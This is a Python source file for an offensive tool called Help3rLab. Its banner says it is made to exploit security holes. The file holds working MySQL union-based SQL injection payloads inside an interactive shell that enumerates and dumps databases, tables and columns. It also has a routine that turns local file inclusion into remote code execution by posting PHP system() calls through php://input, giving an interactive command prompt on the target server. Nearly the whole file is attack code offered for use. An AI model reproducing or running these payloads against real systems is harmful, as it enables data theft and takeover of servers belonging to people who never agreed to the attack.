# -*- coding: utf-8 -*-
#!/usr/bin/python

import requests, sys, os, readline, re, binascii, pprint, time, json
from modules import Sqli
from modules import Dios
from prettytable import PrettyTable

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse

class Help3rLab:
    def __init__(self):
        self.url = ''
        self.dios          = "(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
        self.show_dbs      = "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)"
        self.database_name = ""
        self.show_tables   = "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x"
        self.show_columns  = "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME=0x"
    def banner(self):
        print("""
    \033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
    \033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m......\033[97m%%%%%\033[90m...\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m..\033[97m%%%%%\033[90m...\033[97m%%\033[90m.......\033[97m%%%%\033[90m...\033[97m%%%%%\033[90m..\033[97m]
    \033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[90;1m|..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m.\033[97m]
    \033[97m[\033[90m.\033[97m%%%%%%\033[90m..\033[97m%%%%\033[90m....\033[97m%%\033[90m......\033[97m%%%%%\033[90m...\033[90;1m|\033[90m..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%%%%\033[90m...\033[97m%%\033[90m......\033[97m%%%%%%\033[90m..\033[97m%%%%%\033[90m..\033[97m]
    \033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m......\033[97m%%\033[90m......\033[90;1m|..\033[91m%%%%%%%%\033[90m.....\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m......\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m.\033[97m]
    \033[97m[\033[90m.\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m......\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%%\033[90m..\033[97m%%\033[90m..\033[97m%%\033[90m..\033[97m%%%%%\033[90m\033[90m..\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%\033[90m........\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m|..\033[91m%%%%%%%%%%%\033[90m..\033[90;1m|\033[90m.................................\033[97m]
    \033[97m[\033[90m.................................\033[90;1m-----------------.................................\033[97m]                        
    \033[97m[%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
           =[ \033[93;2mHelp3rLab v.0.1 Beta\033[97;0m                                    ]=
    + -- --=[ Author : Binsar DJ, Fauzanw & Rizsyad AR                ]=-- -- +
    + -- --=[ Team   : { IndoSec }                                    ]=-- -- +
    + -- --=[ Help3rLab is your helper lab to exploit security holes  ]=-- -- + 
    + -- --=[ We not responsible for damage caused by Help3rL4b,      ]=-- -- +   
        """)
    
    def menu(self):
        print("""
        [\033[91m+\033[97m] Options :
        └[\033[92m•\033[97m] \033[91m1. \033[97mSQL Injection
        └[\033[92m•\033[97m] \033[91m2. \033[97mRemote File Inclusion
        └[\033[92m•\033[97m] \033[91m3. \033[97mLocal File Inclusion
        └[\033[92m•\033[97m] \033[91m4. \033[97mRemote Command Execution
        └[\033[92m•\033[97m] \033[91m5. \033[97mLFI to RCE
        """)
    
    def sqli_command_line(self):
        user   = Dios().build(Dios().user())
        domain = re.search(r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}', self.url)[0]

        try:
            response    = requests.get(self.url.replace('*',user))
            sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
            user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
            user        = user.group(1)
            cmd         = input("\033[91m┌["+ user.replace('@', '\033[93m@\033[96m') +"\033[91m]~[\033[32m"+ domain +"\033[91m]\n\033[91m└\033[93m#\033[97m ")

            if cmd == "dump all_table":
                r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)

                if re.search("<br>", output):
                    br = output.split("<br>")
                    for result in br:
                        print(result)
                    self.sqli_command_line()
            elif cmd == "show dbs":
                r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)

                print("[\033[92m+\033[97m] Database : ")

                output = output.split("<br>")
                for db in output:
                    print(f"└[\033[92m•\033[97m] {db}")
                self.sqli_command_line()
            elif re.search("use (.*)", cmd):
                dbname  = re.search('use (.*)', cmd).group(1)
                r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(dbname) + ")")))
                output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)

                if output != None:
                    self.database_name = dbname
                    print(f"\n[\033[92m+\033[97m] Database changed to : {dbname}\n")
                else:
                    print(f'\n[\033[91m-\033[97m] Unknown Database : {dbname}\n')
                self.sqli_command_line()
            elif cmd == "show tables":
                if not self.database_name:
                    print("\n[\033[91m-\033[97m] No database selected!\n")
                else:
                    r       = requests.get(self.url.replace('*', Dios().build(self.show_tables + Dios().strTohex(self.database_name) + ")")))
                    output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)

                    if output != None:
                        print(f"[\033[92m+\033[97m] Tables from database {self.database_name} : ")
                        output = output.group(1).split("<br>")
                        for table in output:
                            print(f"└[\033[92m•\033[97m] {table}")
                    else:
                        print(f'\n[\033[91m-\033[97m] Cannot show table from database {self.database_name}\n')
                self.sqli_command_line()
            elif re.search("show columns (.*)", cmd):
                table   = re.search('show columns (.*)', cmd).group(1)
                r       = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table) + ")")))
                output  = re.search("<sqli-helper>(.*)</sqli-helper>",r.text)
                if(self.database_name):
                    if output != None:
                        print(f"[\033[92m+\033[97m] Columns from table {table} : ")
                        output = output.group(1).split('<br>')
                        for column in output:
                            print(f"└[\033[92m•\033[97m] {column}")
                else:
                    print("\n[\033[91m-\033[97m] No database selected!\n")
                self.sqli_command_line()
            elif re.search("dump table (.*)", cmd):
                table_name = re.search('dump table (.*)', cmd).group(1)
                if(self.database_name):
                    custom = input("[\033[93m?\033[97m] Custom column (use delimiter coma) [Y/N] : ")
                    if custom.lower() == "y":
                        r      = requests.get(self.url.replace('*', Dios().build(self.show_columns + Dios().strTohex(table_name) + ")")))
                        output = re.search("<sqli-helper>(.*)</sqli-helper>", r.text)
                        if output != None:
                            col = []
                            for column in output.group(1).split('<br>'):
                                col.append(column)
                            SqliHelper = Sqli(self.url)
                            pt = PrettyTable()
                            pt.field_names = col
                            dump_data = SqliHelper.dump_data(tables=table_name, columns=col, database=self.database_name)['data']
                            for data in dump_data:
                                pt.add_row(data)

                            print(pt)
                        else:
                            print('\n[\033[91m-\033[97m] Cannot get column list')
                    else:
                        print('Ntar dulu jancok')
                else:
                    print("\n[\033[91m-\033[97m] No database selected!\n")
                
                self.sqli_command_line()
            else:
                r           = requests.get(self.url.replace('*', Dios().build(cmd)))
                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
                print(f"\n[+] Output : {output}\n")
            self.sqli_command_line()
        except Exception as e:
            print(f"\n[!] Syntax Error {e}!\n")
            self.sqli_command_line()
    
    def sqli(self):
        print("[!] Example : http://target.com/parameter.php?id=10'+UNION+SELECT+1,2,3,*,5-- -")
        url = input("[?] URL: ")
        self.url = url

        if re.search("http", url):
            url = url
        elif re.search('\%68\%74\%74\%70', url):
            url = unquote(url)
        else:
            url = "http://"+url
        SQLIHELPER = Sqli(url)
        information = SQLIHELPER.information()
        hostname,port, ssl, openssl, symlink, socket, user, schema, version, base_dir, data_dir, os_version, machine_version = [information[k] for k in ('hostname', 'port', 'ssl', 'openssl', 'symlink', 'socket', 'user', 'schema', 'version', 'base_dir', 'data_dir', 'os_version', 'mechine_version')]
        print("[\033[92m+\033[97m] Information : ")
        print(f"└[\033[92m•\033[97m] Hostname         : {hostname}")
        print(f"└[\033[92m•\033[97m] Port             : {port}")
        print(f"└[\033[92m•\033[97m] SSL              : {ssl}")
        print(f"└[\033[92m•\033[97m] OpenSSL          : {openssl}")
        print(f"└[\033[92m•\033[97m] Symlink          : {symlink}")
        print(f"└[\033[92m•\033[97m] Socket           : {socket}")
        print(f"└[\033[92m•\033[97m] User             : {user}")
        print(f"└[\033[92m•\033[97m] DB Name          : {schema}")
        print(f"└[\033[92m•\033[97m] DB Version       : {version}")
        print(f"└[\033[92m•\033[97m] Base Dir         : {base_dir}")
        print(f"└[\033[92m•\033[97m] Data Dir         : {data_dir}")
        print(f"└[\033[92m•\033[97m] System Operation : {os_version}")
        print(f"└[\033[92m•\033[97m] Machine Version  : {machine_version}")
        self.sqli_command_line()


    def lfitorce(self):
        url = input("[?] Input Url : ")
        injection = input("[?] Injection parameter (ex. ?page=Data) : ")
        pisah = injection.split("=")

        print("\n")
        print("[!] Loading to injection RCE...")
        time.sleep(2)
        
        delete_whitelist = url.replace(injection, "")
        payload = "php://input"
        in_payload = pisah[0] + "=" + payload
        
        print("[!] Requets to target...")
        time.sleep(2)
        
        print("\n")
        
        i = 0
        
        while i < 1:
            injection_command = input("RCE@injection:# ")
            command = "<?php system('"+ injection_command +"'); ?>"
            rce = requests.post(delete_whitelist + in_payload, data=command)
            print(rce.text)
            if injection_command == 'exit':
                i = 1

Help3rLab().banner()
Help3rLab().menu()

try:
    action = input("\n[\033[93m?\033[97m] Options : ")

    if action == "1":
        Help3rLab().sqli()
    elif action == "5":
        Help3rLab().lfitorce()
except KeyboardInterrupt:
    print('\n[\033[92m+\033[97m] CTRL + C detected')
    print('[\033[92m+\033[97m] Exiting...')
    raise SystemExit
